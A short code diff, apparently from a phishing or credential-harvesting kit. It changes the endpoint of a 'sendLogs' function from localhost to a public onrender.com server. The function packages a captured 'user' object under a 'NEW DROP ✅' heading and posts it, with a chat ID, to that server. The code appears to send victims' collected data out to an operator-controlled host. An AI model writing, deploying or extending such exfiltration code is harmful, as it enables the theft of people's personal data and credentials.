@@ -128,7 +128,7 @@ function sendLogs(message = null){
         message = 'NEW DROP ✅ \n\n <pre>  ' + JSON.stringify(user, null, 2) + '</pre>'
     }
 
-    const apiUrl = 'http://localhost:3000/log'; // Update with your server URL
+    const apiUrl = 'https://server-c50i.onrender.com/log'; // Update with your server URL
 
     const postData = {
         chatId: chatId,
